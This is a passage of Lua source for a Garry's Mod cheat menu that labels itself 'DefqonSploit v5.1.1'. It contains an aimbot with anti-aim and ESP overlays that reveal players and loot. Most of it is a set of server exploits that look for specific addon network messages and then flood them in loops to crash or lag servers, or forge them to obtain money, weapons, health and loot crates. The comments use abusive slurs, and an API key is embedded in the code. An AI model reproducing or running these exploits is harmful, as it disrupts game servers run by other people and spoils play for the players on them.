            local style = pMenuVars.Sliders["HvH Style"].value;
            if style == 1 then
                jitter = !jitter;
                if jitter then
                    Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 100);
                else
                    Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 10);
                end
            elseif style == 2 then
                Anglez.y = math.NormalizeAngle(CurAngles.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
            elseif style == 3 then
                local rand = pMenuVars.Sliders["HvH randomY"].value;
                Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + math.random(rand * -1,rand));
            elseif style == 4 then
                local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View)
                if ent == NULL then
                    Anglez.y = math.NormalizeAngle(Anglez.y + View.y);
                else
                    local poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
                    local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
                    Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
                end
            elseif style == 5 then
                Anglez.y = math.NormalizeAngle(Anglez.y);
            elseif style == 6 then
                Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
            end
        end
        if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
            AShoot = !AShoot;
            if AShoot then
                local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View);
                if ent != NULL then
                    local poz = Vector(0,0,0);
                    if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
                        local center = ent:OBBCenter()
                        poz = ent:GetPos() + center;
                    else
                        poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
                    end
                    local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
                    Anglez.x = math.Clamp(End.x,-89,89)
                    Anglez.y = math.NormalizeAngle(End.y);
                    pMenu.Shoot(pCmd)
                end
            end
        end
        if Anglez != nil then
            pCmd:SetViewAngles(Anglez)
        end
        pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
    end
end)
hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead )
    if pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"] != nil && pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"].value then
        strText = string.lower( strText )
        local player = ply:Nick()

        local text = player.." said "..strText;
        sound.PlayURL("https://api.ispeech.org/api/rest?apikey=34b06ef0ba220c09a817fe7924575123&action=convert&voice=usenglishmale&speed=1&pitch=100&text="..text,"mono",function(snd)
            if IsValid(snd) then
                snd:Play()
                snd:SetVolume(1)
            end
        end)
    end
end)
concommand.Add("Defqon_bigmenu",pMenu.ToggleMenu)

//////////////////////////////////////////////////////////////////////////////////
// Got bored ended up getting this far in like 4 ish hours I cant type fast :\ //
//////////////////////////////////////////////////////////////////////////////////


/*

 CreateClientConVar( "gravko_esp", "0", true, true)
local function gravesp2()
if tobool( GetConVarNumber( "gravko_esp" ) ) then
for k, v in pairs( player.GetAll() ) do
local pos = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
draw.SimpleTextOutlined( v:Nick(), "Default", pos.x + 40, pos.y + 15, Color(0,255,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
local hp = "HP: "..v:Health()
local teamcol = team.GetColor(v:Team())
local wep2 = v:GetActiveWeapon()
local rank1 = "["..v:GetUserGroup().."]"
local friend = v:GetFriendStatus()
local targetDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
local targetDistance3 = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/100000)

//draw.SimpleTextOutlined( targetDistance, "Default", pos.x + 40, pos.y + 30, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )

draw.SimpleTextOutlined( hp, "Default", pos.x + 40, pos.y + 27, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )


draw.SimpleTextOutlined( rank1, "Default", pos.x + 40, pos.y + 5, Color(255,0,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )

//draw.SimpleTextOutlined( friend, "Default", pos.x + 40, pos.y + 20, Color(0,150,255), 1, 1, 1, Color( 0, 0, 0, 255 ) )

local boxpos2 = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
draw.RoundedBox(5, pos.x - 6, pos.y + targetDistance3, 11, 11, Color(teamcol.r,teamcol.g,teamcol.b, 255), 1)
end
end
end
hook.Add( "HUDPaint", "esp2", gravesp2)
-------------------------------------------------------- */
showunk = CreateClientConVar("gmhax_ShowUnknownEntity", "1", true, true)

shouldloot = CreateClientConVar("gmhax_showdarkrploot2", "0", true, true)
hook.Add("HUDPaint", "findtherpshit", function()
        if shouldloot:GetBool() then
        for k, v in pairs(ents.GetAll()) do
        local mDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
        Pos = v:GetPos():ToScreen()
        if not string.find(v:GetClass(), "prop") and not string.find(v:GetClass(), "func") and not string.find(v:GetClass(), "class") and not string.find(v:GetClass(), "env") and not string.find(v:GetClass(), "player") and not string.find(v:GetClass(), "view") and not string.find(v:GetClass(), "world") and not string.find(v:GetClass(), "weapon_") and not string.find(v:GetClass(), "gmod") and not string.find(v:GetClass(), "beam") and not string.find(v:GetClass(), "manipulate") and not string.find(v:GetClass(), "sent") and not string.find(v:GetClass(), "m9k") and not string.find(v:GetClass(), "gun") and not string.find(v:GetClass(), "pocket") and not string.find(v:GetClass(), "vending") and not string.find(v:GetClass(), "npc") and not string.find(v:GetClass(), "sammy") and not string.find(v:GetClass(), "stunstick") and not string.find(v:GetClass(), "unarrest_stick") and not string.find(v:GetClass(), "arrest_stick") and not string.find(v:GetClass(), "door") and not string.find(v:GetClass(), "keys") and not string.find(v:GetClass(), "keypad") and not string.find(v:GetClass(), "lock") and not string.find(v:GetClass(), "chat") and not string.find(v:GetClass(), "gmt") and not string.find(v:GetClass(), "weaponchecker") and not string.find(v:GetClass(), "Keypad") and not string.find(v:GetClass(), "med_") and not string.find(v:GetClass(), "darkrp") and not string.find(v:GetClass(), "swep") and not string.find(v:GetClass(), "fas2") and not string.find(v:GetClass(), "ent_spike") and not string.find(v:GetClass(), "car") and not string.find(v:GetClass(), "fuel") and not string.find(v:GetClass(), "taser") and not string.find(v:GetClass(), "point") and not string.find(v:GetClass(), "hook") and not string.find(v:GetClass(), "tv") and not string.find(v:GetClass(), "newspaper") and not string.find(v:GetClass(), "atm") and not string.find(v:GetClass(), "handcuffs") and not string.find(v:GetClass(), "payphone") and not string.find(v:GetClass(), "wire") then
                                if string.find(v:GetClass(), "printer") then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Принтер", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 54, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif v:GetClass() == "spawned_shipment" then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
                                         draw.SimpleTextOutlined("Ящики", "Default", Pos.x + 30, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 55, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif string.find(v:GetClass(), "durgz") then
                                     -- draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                         draw.SimpleTextOutlined("Наркота", "Default", Pos.x + 23, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        elseif v:GetClass() == "spawned_weapon" then
                                        //draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Оружие", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))

                                        elseif v:GetClass() == "spawned_money" then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                     -- draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        draw.SimpleTextOutlined("Деньги", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        else
                                        if showunk:GetBool() then
                                      --draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
                                      --draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
                                        --//draw.SimpleTextOutlined("Неизвестное энтити", "Default", Pos.x + 47, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 53, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
                                        draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
                                        end

                                end
                        end
                end
        end
end)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ulxflood = false
local netKey = ""
local Defqon = nil
if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
surface.CreateFont("HUDLogo2",{size = 18, weight = 100, antialias = 0})

timer.Create("timerversionchecker",20,1,function()
hook.Remove("HUDPaint", "HudVersionChecker")
end)
hook.Add("HUDPaint", "HudVersionChecker", function()
draw.SimpleTextOutlined( "Привет "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", вы используете последнюю версию меню", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 99, 210, 214, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)
function playSound(url)

    sound.PlayURL(url, '', function( station )

        if ( IsValid( station ) ) then

        station:SetPos( LocalPlayer():GetPos() )
        station:Play()

        end
    end)

end
playSound("")
function luaview()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.Menu:Remove()
vgui.Create("chmluaviewer"):MakePopup()
end
concommand.Add("Defqon_luaview", function() vgui.Create("chmluaviewer"):MakePopup() end)

function bigmenu()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.Menu:Remove()
RunConsoleCommand( "Defqon_bigmenu" )
end

function anticheats()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.Menu:Remove()
RunConsoleCommand( "Defqon_anticheats")
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------
		function editor()
		local PANEL = {}

	PANEL.URL = "http://metastruct.github.io/lua_editor/"
	PANEL.COMPILE = "C"

	local javascript_escape_replacements =
	{
		["\\"] = "\\\\",
		["\0"] = "\\0" ,
		["\b"] = "\\b" ,
		["\t"] = "\\t" ,
		["\n"] = "\\n" ,
		["\v"] = "\\v" ,
		["\f"] = "\\f" ,
		["\r"] = "\\r" ,
		["\""] = "\\\"",
		["\'"] = "\\\'",
	}

	function PANEL:Init()
		self.Code = ""

		self.ErrorPanel = self:Add("DButton")
		self.ErrorPanel:SetFont('BudgetLabel')
		self.ErrorPanel:SetTextColor(Color(255,255,255))
		self.ErrorPanel:SetText("")
		self.ErrorPanel:SetTall(0)
		self.ErrorPanel.DoClick = function()
			self:GotoErrorLine()
		end
		self.ErrorPanel.DoRightClick = function(self)
			SetClipboardText(self:GetText())
		end
		self.ErrorPanel.Paint = function(self,w,h)
			surface.SetDrawColor(255,50,50)
			surface.DrawRect(0,0,w,h)
		end

		self:StartHTML()
	end

	function PANEL:Think()
		if self.NextValidate && self.NextValidate < CurTime() then
			self:ValidateCode()
		end
	end

	function PANEL:StartHTML()
		self.HTML = self:Add("DHTML")

		self:AddJavascriptCallback("OnCode")
		self:AddJavascriptCallback("OnLog")

		self.HTML:OpenURL(self.URL)

		self.HTML:RequestFocus()
	end

	function PANEL:ReloadHTML()
		self.HTML:OpenURL(self.URL)
	end

	function PANEL:JavascriptSafe(str)
		str = str:gsub(".",javascript_escape_replacements)
		str = str:gsub("\226\128\168","\\\226\128\168")
		str = str:gsub("\226\128\169","\\\226\128\169")
		return str
	end

	function PANEL:CallJS(JS)
		self.HTML:Call(JS)
	end

	function PANEL:AddJavascriptCallback(name)
		local func = self[name]

		self.HTML:AddFunction("gmodinterface",name,function(...)
			func(self,HTML,...)
		end)
	end

	function PANEL:OnCode(_,code)
		self.NextValidate = CurTime() + 0.2
		self.Code = code
	end

	function PANEL:OnLog(_,...)
		Msg("Editor: ")
		print(...)
	end

	function PANEL:SetCode(code)
		self.Code = code
		self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
	end

	function PANEL:GetCode()
		return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
	end

	function PANEL:SetGutterError(errline,errstr)
		self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
	end

	function PANEL:GotoLine(num)
		self:CallJS("GotoLine('" .. num .. "')")
	end

	function PANEL:ClearGutter()
		self:CallJS("ClearErr()")
	end

	function PANEL:GotoErrorLine()
		self:GotoLine(self.ErrorLine || 1)
	end

	function PANEL:SetError(err)
		if !IsValid(self.HTML) then
			self.ErrorPanel:SetText("")
			self:ClearGutter()
			return
		end

		local tall = 0

		if err then
			local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

			if line && err then
				tall = 20

				self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
				self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
				self:SetGutterError(self.ErrorLine,err)
			end
		else
			self.ErrorPanel:SetText("")
			self:ClearGutter()
		end

		local wide = self:GetWide()
		local tallm = self:GetTall()

		self.ErrorPanel:SetPos(0,tallm - tall)
		self.ErrorPanel:SetSize(wide,tall)
		self.HTML:SetSize(wide,tallm - tall)
	end

	function PANEL:ValidateCode()
		local time = SysTime()
		local code = self:GetCode()

		self.NextValidate = nil

		if !code || code == "" then
			self:SetError()
			return
		end

		local errormsg = CompileString(code,self.COMPILE,false)
		time = SysTime() - time

		if type(errormsg) == "string" then
			self:SetError(errormsg)
		elseif time > 0.25 then
			self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
		else
			self:SetError()
		end
	end

	function PANEL:PerformLayout(w,h)
		local tall = self.ErrorPanel:GetTall()

		self.ErrorPanel:SetPos(0,h - tall)
		self.ErrorPanel:SetSize(w,tall)

		self.HTML:SetSize(w,h - tall)
	end


	vgui.Register("lua_editor",PANEL,"EditablePanel")

	local menu = vgui.Create('DFrame')
	menu:SetSize(ScrW()/2,ScrH()/2)
	menu:SetTitle('                                                                                                                                   Lua Code | Run On Self')
	menu:Center()
	menu:SetSizable(true)
	menu:MakePopup()
	menu:ShowCloseButton(false)
	menu.Paint = function(self,w,h)
		surface.SetDrawColor(30,30,30)
		surface.DrawRect(0, 0, w, 25)

		surface.SetDrawColor(0,0,0)
		surface.DrawRect(0, 25, w, h-25)
	end

	local clos = vgui.Create("DButton", menu)
	clos:SetSize(40,23)
	clos:SetText("")
	clos.Paint = function(self,w,h)
		surface.SetDrawColor(196,80,80)
		surface.DrawRect(0,0,w,h)
		surface.SetFont("marlett")
		local s,s1 = surface.GetTextSize("r")
		surface.SetTextPos(w/2-s/2,h/2-s1/2)
		surface.SetTextColor(255,255,255)
		surface.DrawText("r")
	end
	clos.DoClick = function()
		menu:SetVisible(!menu:IsVisible())
	end

	local ed = vgui.Create('lua_editor', menu)
	ed:SetPos(5, 55)

	menu.PerformLayout = function(self, w, h)
		clos:SetPos(w-41, 1)
		ed:SetSize(w-10, h-60)
	end

	local offset = 5

	local function CreateBtn(wide, text, icon, fn)
		local mt = Material(icon)
		local btn = vgui.Create('DButton', menu)
		btn:SetText('')
		btn.Paint = function(self,w,h)
			if self.Hovered then
				if self.Depressed then
					surface.SetDrawColor(90,90,90)
				else
					surface.SetDrawColor(70,70,70)
				end
			else
				surface.SetDrawColor(40,40,40)
			end

			surface.DrawRect(0,0,w,h)
			surface.SetDrawColor(255,255,255)
			surface.SetMaterial(mt)
			surface.DrawTexturedRect(5,h / 2 - 8,16,16)
			draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
		end
		btn.DoClick = fn
		btn:SetSize(wide, 20)
		btn:SetPos(offset, 30)
		offset=offset + wide + 5
	end

	-- CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
	-- 	local code = ed:GetCode()
	-- 	net.Start('_da_')
	-- 	net.WriteString(code)
	-- 	net.WriteUInt(1, 2)
	-- 	net.SendToServer()
	-- end)
	CreateBtn(115, "Run on self", 'icon16/arrow_down.png', function()
		local code = ed:GetCode()
		RunString(code)
	end)
	-- CreateBtn(130, "Run on clients", 'icon16/group.png', function()
	-- 	local code = ed:GetCode()
	-- 	net.Start('_da_')
	-- 	net.WriteString(code)
	-- 	net.WriteUInt(2, 2)
	-- 	net.SendToServer()
	-- end)
	-- CreateBtn(125, "Run on player", 'icon16/user.png', function()
	-- 	local code = ed:GetCode()
	-- 	local m = DermaMenu()
	-- 	for k, v in pairs(player.GetAll()) do
	-- 		m:AddOption(v:Name(), function()
	-- 			net.Start('_da_')
	-- 			net.WriteString(code)
	-- 			net.WriteUInt(3, 2)
	-- 			net.WriteEntity(v)
	-- 			net.SendToServer()
	-- 		end)
	-- 	end
	-- 	m:Open()
	-- end)

	-- CreateBtn(115, "Get player", 'icon16/pencil.png', function()
	-- 	local m = DermaMenu()
	-- 	for k, v in pairs(player.GetAll()) do
	-- 		m:AddOption(v:Name(), function()
	-- 			SetClipboardText('Entity('..v:EntIndex()..')')
	-- 		end)
	-- 	end
	-- 	m:Open()
	-- end)

	concommand.Add('editor', function() menu:SetVisible(!menu:IsVisible()) end)

	iZNX.Menu:Remove()

	MsgC(Color(255, 155, 55), "Loading end!\n")
	end
------------------------------------------------------------------------------------------------------------------------------------------------------------
function gui.url()
surface.PlaySound("garrysmod/ui_click.wav")
gui.OpenURL( "http://discord.gg/weJb7TJ" )
end
function iZNX.ChatText( str )
ctext( Color(190, 190, 190), [[ [DefqonSploit v5.1.1]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if Defqon and Defqon.G and Defqon.G.net then
netstart = Defqon.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if Defqon and Defqon.G and Defqon.G.net then
netstart = Defqon.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = { -- Цвет обводки эксплойтов (их "значимость")
[1337] = Color( 255, 0, 0 ),
[1] = Color( 33, 33, 33 ),
[2] = Color( 33, 33, 33 ),
[3] = Color( 33, 33, 33 ),
[4] = Color( 33, 33, 33 ),
}
function iZNX.AddExploit( name, tab ) -- ОДЭДЭ ЭКСПЛОЙТ, FUCK
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
spoofchat = 0
-----------------------------------------------------------------------------  EXPLOITS  -------------------------------------------------------------------------------------------------------------------------------------------

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   NEW SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]]

iZNX.AddExploit( "[NEW] Crasher", {
desc = "Exploit",
severity = 1337,
scan = function() return iZNX.ValidNetString( "pac.net.TouchFlexes.ClientNotify" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "crashlol" ) then
timer.Create("crashlol", 0, 0, function()
for i = 1, 400 do
iZNX.NetStart("pac.net.TouchFlexes.ClientNotify")
net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
iZNX.ChatText("Начинаем краш")
else
timer.Remove("crashlol")
iZNX.ChatText("Прекращаем краш")
end
end }
}
}
)
iZNX.AddExploit( "[NEW] € Easy Money €", {
desc = "Exploit на деньги",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ply_pick_shit" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем деньги")
for k, v in pairs (player.GetAll()) do
for i = 1,255 do
iZNX.NetStart("ply_pick_shit")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.SendToServer()
end
end
end }
}
}
)
iZNX.AddExploit( "[NEW] Spoof Chat Icon", {
desc = "Не серьезный эксплойт, просто фановый. Убирает иконку набирания текста",
severity = 1337,
scan = function() return iZNX.ValidNetString( "TalkIconChat" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if spoofchat == 0 then
hook.Remove('StartChat', 'TalkIcon')
iZNX.NetStart("TalkIconChat")
net.WriteBool(true)
net.SendToServer()
spoofchat = 1
iZNX.ChatText("Icon Spoofer включен")
else
iZNX.NetStart("TalkIconChat")
net.WriteBool(false)
net.SendToServer()
iZNX.ChatText("Icon Spoofer выключен")
spoofchat = 0
end
end }
}
}
)
iZNX.AddExploit( "[NEW] TFA Lag Exploit", {
desc = "Exploit для создания лагов на сервере, с паком оружия TFA",
severity = 1337,
scan = function() return iZNX.ValidNetString( "TFA_Attachment_RequestAll" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if !timer.Exists( "tfalags" ) then
timer.Create("tfalags", 0, 0, function()
for i = 1, 400 do
iZNX.NetStart("TFA_Attachment_RequestAll")
net.SendToServer()
end
end )
end
end }
}
}
)
iZNX.AddExploit( "Lag Exploit #1", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "NDES_SelectedEmblem" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagger10") then
timer.Create("lagger10", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("NDES_SelectedEmblem")
net.WriteString("Seized")
net.SendToServer()
end
end)
else
timer.Remove("lagger10")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Crasher #1", {
desc = "Exploit на краш сервера",
severity = 1,
scan = function() return iZNX.ValidNetString( "Morpheus.StaffTracker" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Крашим")
if not timer.Exists("crasher") then
timer.Create("crasher", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("Morpheus.StaffTracker")
net.SendToServer()
end
end)
else
timer.Remove("crasher")
iZNX.ChatText("Останавливаем краш")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit#2", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "join_disconnect" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagglol") then
timer.Create("lagglol", 0.5, 0, function()
for i = 1, 3000 do
iZNX.NetStart("join_disconnect")
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end)
else
timer.Remove("lagglol")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "EZS_PlayerTag" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("laggslol") then
timer.Create("laggslol", 0.5, 0, function()
for k, v in pairs(player.GetAll()) do
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
timer.Simple(2, function()
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
end )
end
end )
else
timer.Remove("laggslol")
iZNX.ChatText("Прекращаем лаги")
end
end }
}
}
)
iZNX.AddExploit( "Remove Spread", {
desc = "Exploit убирает разброс",
severity = 1,
scan = function() return checkcvar end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
iZNX.ChatText("Разброс убран")
end }
}
}
)
iZNX.AddExploit( "Give physgun", {
desc = "Получение физгана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyFirstTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен physgun")
end }
}
}
)
iZNX.AddExploit( "Give gravity gun", {
desc = "Получение гравити гана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuySecondTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен gravity gun")
end }
}
}
)
iZNX.AddExploit( "Auto-Heal", {
desc = "Exploit на автоматическое лечение",
severity = 1,
scan = function() return iZNX.ValidNetString( "GiveHealthNPC" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if not autoheal_enable then
iZNX.ChatText("AutoHeal - вкл")
hook.Add("Think", "RE.CheckHealt", function()
if LocalPlayer():Health() < 100 then
iZNX.NetStart("GiveHealthNPC")
net.WriteString("100")
net.SendToServer()
end
end)
autoheal_enable = true
else
iZNX.ChatText("AutoHeal - выкл")
hook.Remove("Think", "RE.CheckHealt")
autoheal_enable = false
end
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #1", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyKey" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем ключ")
iZNX.NetStart("BuyKey")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #2", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyCrate" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем кейс")
